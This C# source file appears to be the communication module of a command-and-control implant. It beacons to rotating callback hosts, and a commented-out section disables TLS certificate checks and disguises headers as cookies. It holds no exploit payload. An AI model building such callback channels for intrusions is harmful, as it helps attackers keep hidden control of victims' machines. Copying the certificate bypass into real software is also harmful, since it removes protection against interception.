using Agent.Models;
using System.Net;
using System.Text;

namespace Agent.Services
{
    internal class CommunicationService
    {
        internal BaseConfig? BaseConfig { get; set; }

        private int lastUrlUsed = -1;

        public CommunicationService(BaseConfig baseConfig)
        {
            BaseConfig = baseConfig;
        }

        internal async Task<string> SimpleGetAsync(string slug)
        {
            ArgumentException.ThrowIfNullOrWhiteSpace(slug);

            var callbackUri = new Uri(GetCallbackUrl());

            using (var client = new HttpClient())
            {
                var result = await client.GetStringAsync(new Uri(callbackUri, slug));

                return result ?? string.Empty;
            }
        }

        internal async Task<string> SimplePostAsync(string slug, string jsonData)
        {
            ArgumentException.ThrowIfNullOrWhiteSpace(slug, nameof(slug));
            ArgumentException.ThrowIfNullOrWhiteSpace(jsonData, nameof(jsonData));

            HttpResponseMessage response;
            var callbackUri = new Uri(GetCallbackUrl());

            using (var client = new HttpClient())
            {
                var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

                var data = await content.ReadAsStringAsync();

                response = await client.PostAsync(new Uri(callbackUri, slug).ToString(), content);
            }

            if (response == null || !response.IsSuccessStatusCode) return string.Empty;

            return await response.Content.ReadAsStringAsync();
        }

        private string GetCallbackUrl()
        {
            string url = string.Empty;
            int retries = 0;

            while (retries < 500) // TODO: Should implement rotation retries to listener config
            {
                switch (BaseConfig.Config.HostRotation)
                {
                    case CallbackRotationType.Fallback:
                        url = BaseConfig.Config.Hosts[0];
                        break;
                    case CallbackRotationType.Sequential:
                        lastUrlUsed = (lastUrlUsed + 1) % BaseConfig.Config.Hosts.Count;
                        url = BaseConfig.Config.Hosts[lastUrlUsed];
                        break;
                    case CallbackRotationType.Random:
                        var random = new Random();
                        url = BaseConfig.Config.Hosts[random.Next(0, BaseConfig.Config.Hosts.Count)];
                        break;
                    default:
                        url = "http://127.0.0.1:8080";
                        break;
                }

                if (IsUrlAlive(url))
                {
                    return url;
                }

                retries++;
                Thread.Sleep(BaseConfig.Sleep);
            }

            return "http://127.0.0.1:8080"; // Fallback URL if all retries fail
        }

        private bool IsUrlAlive(string url)
        {
            try
            {
                var request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "HEAD";
                using (var response = (HttpWebResponse)request.GetResponse())
                {
                    return response.StatusCode == HttpStatusCode.OK;
                }
            }
            catch
            {
                return false;
            }
        }
    }

    #region For use later
    //internal async Task<HttpResponseMessage> GetAsync(string slug, bool useCookies = true)
    //{
    //    // This is for dealing with self-signed certificates - fix this later
    //    // TODO add actual handlers here to verify cert is genuine/add pinning functionality
    //    ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;

    //    // Get url and save it since it will rotate every time it is called
    //    var callbackUri = new Uri(GetCallbackUrl());

    //    // DEBUG: Assuming TrimEnd works by trimming only trailing chars
    //    using (var message = new HttpRequestMessage(HttpMethod.Get, new Uri(callbackUri, slug)))
    //    {
    //        // TODO: find out if this works - should make sure that we control the UserAgent
    //        message.Headers.UserAgent.Clear();

    //        // Find the UserAgent header in the list of headers in the config, then add the value to the headers
    //        // https://stackoverflow.com/questions/1024559/when-to-use-first-and-when-to-use-firstordefault-with-linq
    //        // note that I skip the .Where and instead use the expression I would use in the .Where call inside the .First call
    //        message.Headers.UserAgent.ParseAdd(AgentConfig.Headers.First(header => header.Key == "User-Agent").Value);

    //        // Headers can be put in cookies or just sent as simple http headers
    //        // https://security.stackexchange.com/questions/40189/is-a-cookie-safer-than-a-simple-http-header
    //        if (useCookies)
    //        {
    //            var baseAddress = callbackUri;
    //            var cookieContainer = new CookieContainer();
    //            using (var handler = new HttpClientHandler { CookieContainer = cookieContainer })
    //            using (var client = new HttpClient(handler) { BaseAddress = baseAddress })
    //            {
    //                foreach (var header in AgentConfig.Headers)
    //                {
    //                    if (header.Key.Contains("User-Agent")) continue;

    //                    cookieContainer.Add(baseAddress, new Cookie(header.Key, header.Value));
    //                }

    //                return await client.SendAsync(message);
    //            }
    //        }
    //        else
    //        {
    //            foreach (var header in AgentConfig.Headers)
    //            {
    //                if (header.Key.Contains("User-Agent")) continue;

    //                message.Headers.Add(header.Key, header.Value);
    //            }

    //            using (var client = new HttpClient())
    //            {
    //                return await client.SendAsync(message);
    //            }
    //        }
    //    }
    //}

    //internal async Task<HttpResponseMessage> PostAsync(string slug, string jsonData, bool useCookies = true)
    //{
    //    // This is for dealing with self-signed certificates - fix this later
    //    // TODO add actual handlers here to verify cert is genuine/add pinning functionality
    //    ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;

    //    // Get url and save it since it will rotate every time it is called
    //    var callbackUrl = GetCallbackUrl();

    //    // DEBUG: Assuming TrimEnd works by trimming only trailing chars
    //    using (var message = new HttpRequestMessage(HttpMethod.Post, $"{callbackUrl}{slug.TrimEnd('/')}"))
    //    {
    //        // TODO: find out if this works - should make sure that we control the UserAgent
    //        message.Headers.UserAgent.Clear();

    //        // Find the UserAgent header in the list of headers in the config, then add the value to the headers
    //        // https://stackoverflow.com/questions/1024559/when-to-use-first-and-when-to-use-firstordefault-with-linq
    //        // note that I skip the .Where and instead use the expression I would use in the .Where call inside the .First call
    //        message.Headers.UserAgent.ParseAdd(AgentConfig.Headers.First(header => header.Key == "User-Agent").Value);

    //        // Headers can be put in cookies or just sent as simple http headers
    //        // https://security.stackexchange.com/questions/40189/is-a-cookie-safer-than-a-simple-http-header
    //        if (useCookies)
    //        {
    //            var baseAddress = new Uri(callbackUrl);
    //            var cookieContainer = new CookieContainer();
    //            using (var handler = new HttpClientHandler { CookieContainer = cookieContainer })
    //            using (var client = new HttpClient(handler) { BaseAddress = baseAddress })
    //            {
    //                foreach (var header in AgentConfig.Headers)
    //                {
    //                    if (header.Key.Contains("User-Agent")) continue;

    //                    cookieContainer.Add(baseAddress, new Cookie(header.Key, header.Value));
    //                }

    //                message.Content = new StringContent(messageCrafter.Wrap(messageCrafter.Create(jsonData)));

    //                return await client.SendAsync(message);
    //            }
    //        }
    //        else
    //        {
    //            foreach (var header in AgentConfig.Headers)
    //            {
    //                if (header.Key.Contains("User-Agent")) continue;

    //                message.Headers.Add(header.Key, header.Value);
    //            }

    //            using (var client = new HttpClient())
    //            {
    //                return await client.SendAsync(message);
    //            }
    //        }
    //    }
    //}
    #endregion
}